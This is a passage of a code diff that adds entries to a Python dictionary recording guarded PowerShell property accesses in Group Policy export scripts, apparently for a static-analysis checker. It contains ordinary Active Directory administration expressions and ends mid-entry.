@@ -5866,6 +5866,1062 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
                 ),
             ),
         ),
+        (
+            "$zipEnumErr.Count",
+            (
+                "function New-GpoExportZip",
+                "try",
+                "if ($zipEnumErr) after []",
+            ),
+        ),
+        (
+            "$ExportPath.Length",
+            (
+                "function New-GpoExportZip",
+                "try",
+                "guard if ($zipEnumErr) -> throw",
+                "try",
+            ),
+        ),
+        (
+            "$f.FullName",
+            (
+                "function New-GpoExportZip",
+                "try",
+                "guard if ($zipEnumErr) -> throw",
+                "try",
+                "foreach ($f in $diskFiles)",
+            ),
+        ),
+        (
+            "$f.FullName",
+            (
+                "function New-GpoExportZip",
+                "try",
+                "guard if ($zipEnumErr) -> throw",
+                "try",
+                "foreach ($f in $diskFiles)",
+            ),
+        ),
+        (
+            "$diskFiles.Count",
+            (
+                "function New-GpoExportZip",
+                "try",
+                "guard if ($zipEnumErr) -> throw",
+            ),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "function New-GpoExportZip",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "function New-GpoExportZip",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception.Message",
+            ("catch []",),
+        ),
+        (
+            "$_.Exception",
+            ("catch []",),
+        ),
+        (
+            "$dom.DNSRoot",
+            (),
+        ),
+        (
+            "$allGpos.Count",
+            (),
+        ),
+        (
+            "@(Get-ADOrganizationalUnit -Filter *).Count",
+            (),
+        ),
+        (
+            (
+                "@(Get-ADObject -Filter \"objectClass -eq 'msWMI-Som'\" -Properties "
+                "'msWMI-Name' -ErrorAction SilentlyContinue).Count"
+            ),
+            (),
+        ),
+        (
+            (
+                "@(Get-ADObject -SearchBase "
+                '"CN=Sites,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter '
+                '"(objectClass=site)" -ErrorAction SilentlyContinue).Count'
+            ),
+            (),
+        ),
+        (
+            "(Get-ADRootDSE).configurationNamingContext",
+            (),
+        ),
+        (
+            "$dom.DNSRoot",
+            (
+                "if ($DryRun) after []",
+                "if (-not $SkipSysvol) after []",
+            ),
+        ),
+        (
+            "$dom.DNSRoot",
+            (
+                "if ($DryRun) after []",
+                "if (-not $SkipSysvol) after []",
+            ),
+        ),
+        (
+            (
+                "(Get-ChildItem $src -Recurse -File -ErrorAction SilentlyContinue | "
+                "Measure-Object -Property Length -Sum).Sum"
+            ),
+            (
+                "if ($DryRun) after []",
+                "if (-not $SkipSysvol) after []",
+            ),
+        ),
+        (
+            "$dom.DNSRoot",
+            ("if ($DryRun) after []",),
+        ),
+        (
+            "$dom.DNSRoot",
+            ("guard if ($DryRun) -> return",),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "$gpo.DisplayName",
+            (
+                "guard if ($DryRun) -> return",
+                "foreach ($gpo in $allGpos)",
+            ),
+        ),
+        (
+            "$gpo.Id",
+            (
+                "guard if ($DryRun) -> return",
+                "foreach ($gpo in $allGpos)",
+                "try",
+            ),
+        ),
+        (
+            "$gpo.Id",
+            (
+                "guard if ($DryRun) -> return",
+                "foreach ($gpo in $allGpos)",
+                "try",
+            ),
+        ),
+        (
+            "$gpo.Id.Guid",
+            (
+                "guard if ($DryRun) -> return",
+                "foreach ($gpo in $allGpos)",
+                "catch []",
+            ),
+        ),
+        (
+            "$gpo.Id",
+            (
+                "guard if ($DryRun) -> return",
+                "foreach ($gpo in $allGpos)",
+                "catch []",
+            ),
+        ),
+        (
+            "$gpo.DisplayName",
+            (
+                "guard if ($DryRun) -> return",
+                "foreach ($gpo in $allGpos)",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "guard if ($DryRun) -> return",
+                "foreach ($gpo in $allGpos)",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "guard if ($DryRun) -> return",
+                "foreach ($gpo in $allGpos)",
+                "catch []",
+            ),
+        ),
+        (
+            "$gpo.DisplayName",
+            (
+                "guard if ($DryRun) -> return",
+                "foreach ($gpo in $allGpos)",
+                "catch []",
+            ),
+        ),
+        (
+            "$gpo.Id",
+            (
+                "guard if ($DryRun) -> return",
+                "foreach ($gpo in $allGpos)",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "guard if ($DryRun) -> return",
+                "foreach ($gpo in $allGpos)",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "guard if ($DryRun) -> return",
+                "foreach ($gpo in $allGpos)",
+                "catch []",
+            ),
+        ),
+        (
+            "$dom.DistinguishedName",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "$_.Name",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "scriptblock positional of ForEach-Object",
+            ),
+        ),
+        (
+            "$_.displayName",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "scriptblock positional of ForEach-Object",
+            ),
+        ),
+        (
+            "[System.StringComparer]::OrdinalIgnoreCase",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "$g.Id.Guid",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($g in $allGpos)",
+            ),
+        ),
+        (
+            "$g.Id",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($g in $allGpos)",
+            ),
+        ),
+        (
+            "$gpc.Name",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($gpc in $allGpc)",
+            ),
+        ),
+        (
+            "$gpc.displayName",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($gpc in $allGpc)",
+                "if (-not $knownIds.Contains($guid)) after []",
+            ),
+        ),
+        (
+            "$gpc.displayName",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($gpc in $allGpc)",
+                "if (-not $knownIds.Contains($guid)) after []",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "$gpc.displayName",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($gpc in $allGpc)",
+                "if (-not $knownIds.Contains($guid)) after []",
+                "if ($gpc.displayName) after []",
+            ),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "$collectionErrors.Count",
+            (
+                "guard if ($DryRun) -> return",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "$collectionErrors.Count",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($collectionErrors.Count -eq 0)]",
+            ),
+        ),
+        (
+            "$_.User.DSVersion",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "scriptblock in CommandExpressionAst",
+            ),
+        ),
+        (
+            "$_.User",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "scriptblock in CommandExpressionAst",
+            ),
+        ),
+        (
+            "$_.User.SysvolVersion",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "scriptblock in CommandExpressionAst",
+            ),
+        ),
+        (
+            "$_.User",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "scriptblock in CommandExpressionAst",
+            ),
+        ),
+        (
+            "$_.Computer.DSVersion",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "scriptblock in CommandExpressionAst",
+            ),
+        ),
+        (
+            "$_.Computer",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "scriptblock in CommandExpressionAst",
+            ),
+        ),
+        (
+            "$_.Computer.SysvolVersion",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "scriptblock in CommandExpressionAst",
+            ),
+        ),
+        (
+            "$_.Computer",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "scriptblock in CommandExpressionAst",
+            ),
+        ),
+        (
+            "$_.WmiFilter.Name",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "scriptblock in CommandExpressionAst",
+            ),
+        ),
+        (
+            "$_.WmiFilter",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "scriptblock in CommandExpressionAst",
+            ),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "$dom.DistinguishedName",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "$targets.Count",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "$g.Path",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($t in $targets)",
+                "try",
+            ),
+        ),
+        (
+            "$g.Name",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($t in $targets)",
+                "try",
+            ),
+        ),
+        (
+            "$g.ContainerType",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($t in $targets)",
+                "try",
+            ),
+        ),
+        (
+            "$g.GpoInheritanceBlocked",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($t in $targets)",
+                "try",
+            ),
+        ),
+        (
+            "$g.InheritedGpoLinks",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($t in $targets)",
+                "try",
+            ),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($t in $targets)",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($t in $targets)",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "(Get-ADRootDSE).configurationNamingContext",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.'msWMI-Name'",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "scriptblock in CommandExpressionAst",
+            ),
+        ),
+        (
+            "$_.'msWMI-Parm2'",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "scriptblock in CommandExpressionAst",
+            ),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "[System.StringComparer]::OrdinalIgnoreCase",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "$f.FullName",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($f in $xmlFiles)",
+                "try",
+            ),
+        ),
+        (
+            "$m.Value",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($f in $xmlFiles)",
+                "try",
+                "foreach ($m in [regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+'))",
+            ),
+        ),
+        (
+            "$m.Value",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "if (Test-Path -LiteralPath $metaPath) after []",
+                "try",
+                "foreach ($m in [regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+'))",
+            ),
+        ),
+        (
+            "$allSids.Count",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "$sidObj.Translate([System.Security.Principal.NTAccount]).Value",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($sid in ($allSids | Sort-Object))",
+                "try",
+            ),
+        ),
+        (
+            "$principals[$_].type",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "scriptblock positional of Where-Object",
+            ),
+        ),
+        (
+            "$domainSids.Count",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "$domainSids.Count",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "if ($domainSids.Count -gt 0) after []",
+            ),
+        ),
+        (
+            "$obj.sAMAccountName",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "if ($domainSids.Count -gt 0) after []",
+                "foreach ($sid in $domainSids)",
+                "try",
+                "if ($obj) after []",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "$obj.sAMAccountName",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "if ($domainSids.Count -gt 0) after []",
+                "foreach ($sid in $domainSids)",
+                "try",
+                "if ($obj) after []",
+                "if ($obj.sAMAccountName) after []",
+            ),
+        ),
+        (
+            "$obj.Name",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "if ($domainSids.Count -gt 0) after []",
+                "foreach ($sid in $domainSids)",
+                "try",
+                "if ($obj) after []",
+                "else of [($obj.sAMAccountName)]",
+            ),
+        ),
+        (
+            "$obj.objectClass",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "if ($domainSids.Count -gt 0) after []",
+                "foreach ($sid in $domainSids)",
+                "try",
+                "if ($obj) after []",
+            ),
+        ),
+        (
+            "$dom.DNSRoot",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "if ($domainSids.Count -gt 0) after []",
+                "foreach ($sid in $domainSids)",
+                "try",
+                "if ($obj) after []",
+            ),
+        ),
+        (
+            "$dom.DNSRoot",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "if ($domainSids.Count -gt 0) after []",
+                "foreach ($sid in $domainSids)",
+                "try",
+                "if ($obj) after []",
+            ),
+        ),
+        (
+            "$dom.DNSRoot",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "$principals.Keys",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "$principals[$_].type",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "scriptblock positional of Where-Object",
+            ),
+        ),
+        (
+            "$groupSids.Count",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "$principals[$gSid].name",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($gSid in $groupSids)",
+            ),
+        ),
+        (
+            "$_.SID.Value",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($gSid in $groupSids)",
+                "try",
+                "scriptblock positional of ForEach-Object",
+            ),
+        ),
+        (
+            "$_.SID",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($gSid in $groupSids)",
+                "try",
+                "scriptblock positional of ForEach-Object",
+            ),
+        ),
+        (
+            "$memberSids.Count",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($gSid in $groupSids)",
+                "try",
+            ),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($gSid in $groupSids)",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($gSid in $groupSids)",
+                "catch []",
+            ),
+        ),
+        (
+            "$dom.DNSRoot",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            "$dom.DNSRoot",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+            ),
+        ),
+        (
+            "$dom.DNSRoot",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+            ),
+        ),
+        (
+            "$pf.FullName",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+                "foreach ($pf in $policyFolders)",
+                "try",
+            ),
+        ),
+        (
+            "$pf.Name",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+                "foreach ($pf in $policyFolders)",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+                "foreach ($pf in $policyFolders)",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+                "foreach ($pf in $policyFolders)",
+                "catch []",
+            ),
+        ),
+        (
+            "$pf.Name",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+                "foreach ($pf in $policyFolders)",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+                "foreach ($pf in $policyFolders)",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+                "foreach ($pf in $policyFolders)",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.FullName",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+                "scriptblock positional of ForEach-Object",
+            ),
+        ),
+        (
+            (
+                "@(Get-ChildItem -LiteralPath $dest -Recurse -File -ErrorAction "
+                "SilentlyContinue).Count"
+            ),
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+            ),
+        ),
+        (
+            "$policyFolders.Count",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "$policyFolders.Count",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "$srcErr[0].Exception.Message",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
+                "if ($policyFolders.Count -eq 0) after []",
+                "if ($srcErr) after []",
+            ),
+        ),
+        (
+            "$srcErr[0].Exception",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
+                "if ($policyFolders.Count -eq 0) after []",
+                "if ($srcErr) after []",
+            ),
+        ),
+        (
+            "$successSections.Count",
+            ("guard if ($DryRun) -> return",),
+        ),
+        (
+            "$failedSections.Count",
+            (
+                "guard if ($DryRun) -> return",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "$failedSections.Count",
+            (
+                "guard if ($DryRun) -> return",
+                "if ($failedSections.Count -gt 0) after []",
+            ),
+        ),
     ),
     "Export-GroupMembers.ps1": (
         (
@@ -5923,6 +6979,119 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
         ),
         (
             'Write-Host "Done: $expanded expanded, $failed failed -> $OutputPath"',
+            (),
+        ),
+        (
+            "$adParams.Credential",
+            ("if ($Credential) after []",),
+        ),
+        (
+            "$principalsData.principals.PSObject.Properties",
+            (),
+        ),
+        (
+            "$principalsData.principals.PSObject",
+            (),
+        ),
+        (
+            "$principalsData.principals",
+            (),
+        ),
+        (
+            "$_.Value.type",
+            ("scriptblock positional of Where-Object",),
+        ),
+        (
+            "$_.Value",
+            ("scriptblock positional of Where-Object",),
+        ),
+        (
+            "$groups.Count",
+            (),
+        ),
+        (
+            "$grp.Name",
+            ("foreach ($grp in $groups)",),
+        ),
+        (
+            "$grp.Value.name",
+            ("foreach ($grp in $groups)",),
+        ),
+        (
+            "$grp.Value",
+            ("foreach ($grp in $groups)",),
+        ),
+        (
+            "$m.SID",
+            (
+                "foreach ($grp in $groups)",
+                "try",
+                "foreach ($m in $members)",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "$m.SID.Value",
+            (
+                "foreach ($grp in $groups)",
+                "try",
+                "foreach ($m in $members)",
+                "if ($m.SID) after []",
+            ),
+        ),
+        (
+            "$m.SID",
+            (
+                "foreach ($grp in $groups)",
+                "try",
+                "foreach ($m in $members)",
+                "if ($m.SID) after []",
+            ),
+        ),
+        (
+            "$memberSids.Count",
+            (
+                "foreach ($grp in $groups)",
+                "try",
+            ),
+        ),
+        (
+            "$memberSids.Count",
+            (
+                "foreach ($grp in $groups)",
+                "try",
+            ),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "foreach ($grp in $groups)",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "foreach ($grp in $groups)",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "foreach ($grp in $groups)",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "foreach ($grp in $groups)",
+                "catch []",
+            ),
+        ),
+        (
+            "$principalsData.domain",
             (),
         ),
     ),
@@ -6174,6 +7343,178 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
                 "foreach ($sid in $allSids | Sort-Object)",
                 "try",
             ),
+        ),
+        (
+            "[System.StringComparer]::OrdinalIgnoreCase",
+            (),
+        ),
+        (
+            '(Get-ChildItem $reportsDir -Filter "*.xml" -ErrorAction SilentlyContinue).FullName',
+            (
+                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
+                "if (Test-Path $reportsDir) after []",
+            ),
+        ),
+        (
+            "$m.Value",
+            (
+                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
+                "foreach ($f in $xmlFiles)",
+                "try",
+                "foreach ($m in $matches)",
+            ),
+        ),
+        (
+            "$m.Value",
+            (
+                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
+                "if (Test-Path $metaFile) after []",
+                "try",
+                "foreach ($m in $matches)",
+            ),
+        ),
+        (
+            "$adParams.Credential",
+            (
+                "else of [($SddlSource -and (Test-Path $SddlSource))]",
+                "if ($Credential) after []",
+            ),
+        ),
+        (
+            "$dom.DistinguishedName",
+            ("else of [($SddlSource -and (Test-Path $SddlSource))]",),
+        ),
+        (
+            "$gpc.nTSecurityDescriptor",
+            (
+                "else of [($SddlSource -and (Test-Path $SddlSource))]",
+                "foreach ($gpc in $gpcObjs)",
+                "try",
+            ),
+        ),
+        (
+            "$m.Value",
+            (
+                "else of [($SddlSource -and (Test-Path $SddlSource))]",
+                "foreach ($gpc in $gpcObjs)",
+                "try",
+                "if ($sd) after []",
+                "foreach ($m in $matches)",
+            ),
+        ),
+        (
+            "$allSids.Count",
+            (),
+        ),
+        (
+            "$sidObj.Translate([System.Security.Principal.NTAccount]).Value",
+            (
+                "foreach ($sid in $allSids | Sort-Object)",
+                "try",
+            ),
+        ),
+        (
+            "$principals[$_].type",
+            ("scriptblock positional of Where-Object",),
+        ),
+        (
+            "$domainSids.Count",
+            ("if-condition after []",),
+        ),
+        (
+            "$domainSids.Count",
+            ("if ($domainSids.Count -gt 0) after []",),
+        ),
+        (
+            "$adParams.Credential",
+            (
+                "if ($domainSids.Count -gt 0) after []",
+                "if ($Credential) after []",
+            ),
+        ),
+        (
+            "$principals[$sid].type",
+            (
+                "if ($domainSids.Count -gt 0) after []",
+                "foreach ($sid in $domainSids)",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "$obj.sAMAccountName",
+            (
+                "if ($domainSids.Count -gt 0) after []",
+                "foreach ($sid in $domainSids)",
+                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
+                "try",
+                "if ($obj) after []",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "$obj.sAMAccountName",
+            (
+                "if ($domainSids.Count -gt 0) after []",
+                "foreach ($sid in $domainSids)",
+                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
+                "try",
+                "if ($obj) after []",
+                "if ($obj.sAMAccountName) after []",
+            ),
+        ),
+        (
+            "$obj.Name",
+            (
+                "if ($domainSids.Count -gt 0) after []",
+                "foreach ($sid in $domainSids)",
+                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
+                "try",
+                "if ($obj) after []",
+                "else of [($obj.sAMAccountName)]",
+            ),
+        ),
+        (
+            "$obj.objectClass",
+            (
+                "if ($domainSids.Count -gt 0) after []",
+                "foreach ($sid in $domainSids)",
+                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
+                "try",
+                "if ($obj) after []",
+            ),
+        ),
+        (
+            "$dom.NetBIOSName",
+            (
+                "if ($domainSids.Count -gt 0) after []",
+                "foreach ($sid in $domainSids)",
+                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
+                "try",
+                "if ($obj) after []",
+                "if ($dom) after []",
+            ),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "if ($domainSids.Count -gt 0) after []",
+                "foreach ($sid in $domainSids)",
+                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "if ($domainSids.Count -gt 0) after []",
+                "foreach ($sid in $domainSids)",
+                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
+                "catch []",
+            ),
+        ),
+        (
+            "$dom.DNSRoot",
+            ("if ($dom) after []",),
         ),
     ),
     "Run-GpoLensCollection.ps1": (
@@ -7552,6 +8893,681 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
                 "finally",
             ),
         ),
+        (
+            "$line.Length",
+            (
+                "function Write-GpoLensCollectionLog",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "(Get-Item -LiteralPath $LogPath).Length",
+            (
+                "function Write-GpoLensCollectionLog",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "$_.BaseName",
+            (
+                "function Get-GpoLensCompletedExports",
+                "scriptblock positional of Where-Object",
+            ),
+        ),
+        (
+            "$_.BaseName",
+            (
+                "function Get-GpoLensCompletedExports",
+                "scriptblock positional of Where-Object",
+            ),
+        ),
+        (
+            "$_.BaseName",
+            (
+                "function Get-GpoLensCompletedExports",
+                "scriptblock in CommandExpressionAst",
+            ),
+        ),
+        (
+            "$_.BaseName.Length",
+            (
+                "function Get-GpoLensCompletedExports",
+                "scriptblock in CommandExpressionAst",
+            ),
+        ),
+        (
+            "$_.BaseName",
+            (
+                "function Get-GpoLensCompletedExports",
+                "scriptblock in CommandExpressionAst",
+            ),
+        ),
+        (
+            "$archive.FullName",
+            (
+                "function Get-GpoLensCompletedExports",
+                "foreach ($archive in $candidates)",
+                "try",
+            ),
+        ),
+        (
+            "$archive.Name",
+            (
+                "function Get-GpoLensCompletedExports",
+                "foreach ($archive in $candidates)",
+                "try",
+                "else of [($zip.GetEntry('AllGPOs.xml'))]",
+            ),
+        ),
+        (
+            "$archive.Name",
+            (
+                "function Get-GpoLensCompletedExports",
+                "foreach ($archive in $candidates)",
+                "catch []",
+            ),
+        ),
+        (
+            "$pending.Count",
+            (
+                "function Assert-GpoLensRegularTree",
+                "While ($pending.Count -gt 0)",
+            ),
+        ),
+        (
+            "$item.Attributes",
+            (
+                "function Assert-GpoLensRegularTree",
+                "While ($pending.Count -gt 0)",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "[IO.FileAttributes]::ReparsePoint",
+            (
+                "function Assert-GpoLensRegularTree",
+                "While ($pending.Count -gt 0)",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "$child.Attributes",
+            (
+                "function Assert-GpoLensRegularTree",
+                "While ($pending.Count -gt 0)",
+                "guard if ($item.Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw",
+                "foreach ($child in @(Get-ChildItem -LiteralPath $directory -Force))",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "[IO.FileAttributes]::ReparsePoint",
+            (
+                "function Assert-GpoLensRegularTree",
+                "While ($pending.Count -gt 0)",
+                "guard if ($item.Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw",
+                "foreach ($child in @(Get-ChildItem -LiteralPath $directory -Force))",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "$child.PSIsContainer",
+            (
+                "function Assert-GpoLensRegularTree",
+                "While ($pending.Count -gt 0)",
